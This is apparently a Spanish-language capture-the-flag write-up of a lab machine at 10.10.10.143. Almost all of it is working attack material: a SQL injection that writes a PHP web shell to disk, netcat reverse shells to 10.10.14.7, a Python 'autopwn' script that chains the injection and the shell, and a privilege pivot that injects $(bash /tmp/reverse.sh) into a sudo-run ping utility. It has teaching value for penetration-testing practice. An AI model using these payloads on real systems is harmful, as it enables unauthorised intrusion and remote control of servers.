## Vuln exploit & Gaining Access {-}

### S4vishell desde un SQL Injection {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos la s4vishell.php desde el SQL Injection

    ```bash
    http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/s4vishell.php" -- -
    ```

1. Vamos a la pagina `http://10.10.10.143/s4vishell.php`
1. Probamos commandos

    ```bash
    http://10.10.10.143/s4vishell.php?cmd=id
    http://10.10.10.143/s4vishell.php?cmd=hostname -I
    http://10.10.10.143/s4vishell.php?cmd=ps -faux
    http://10.10.10.143/s4vishell.php?cmd=which nc
    ```

1. lanzamos una reverse SHELL

    ```bash
    http://10.10.10.143/s4vishell.php?cmd=nc -e /bin/bash 10.10.14.7 443
    ```

Ya hemos ganado accesso al systema.

```bash
whoami 

>www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Autopwn in python {-}

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import time 
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo..\n")
    sys.exit(1)

# Ctrl_C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
create_file = '''http://10.10.10.143/room.php?cod=-1 union select 1,2,"<?php system('nc -e /bin/bash 10.10.14.7 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"-- -'''
exec_file = "http://10.10.10.143/reverse.php"
lport = 443

def makeRequest():
    r = request.get(create_file)
    r = request.get(exec_file)

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()

```

### User pivoting al usuario pepper {-}

Hemos podido comprobar que no podiamos leer el fichero `user.txt` siendo el usuario `www-data`. Tendremos que convertirnos en el usuario
**pepper** antes de intentar rootear la maquina.

```bash
id
sudo -l
```

Aqui vemos que podemos ejecutar el script `/var/www/Admin-Utilities/simpler.py` como el usuario **pepper** sin proporcinar contraseña.

Si lanzamos el script con el commando `sudo -u pepper /var/www/Admin-Utilities/simpler.py` vemos que es una utilidad que lanza un ping a maquinas
definidas por el commando `-p`.

si nos ponemos en escucha por trazas **ICMP** con el commando `tcpdump -i tun0 icmp -n` y que lanzamos el script:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> 10.10.14.7
```

Recibimos la traza **ICMP**.

Intentamos ver si podemos injectar commandos con el script.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> 10.10.14.$(echo 7)
```

Aqui tambien recibimos la traza **ICMP** lo que significa que el programa interpreta codigo.

Si nos ponemos en escucha por el puerto 443 con `nc -nlvp 443` y que le ponemos

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(nc -e /bin/bash 10.10.14.7 443)
```

No funcciona. Si miramos el codigo fuente de script en python, vemos que hay caracteres que son considerados como invalidos.
Uno de ellos es el `-`

Decidimos crearnos un fichero `reverse.sh`

```bash
cd /tmp
nano reverse.sh`


#!/bin/bash

nc -e /bin/bash 10.10.14.7 443
```

Le damos derechos de ejecucion y lanzamos el script una vez mas.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(bash /tmp/reverse.sh)
```

Ya hemos podido entablar la conneccion como el usuario pepper y podemos ver la flag.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```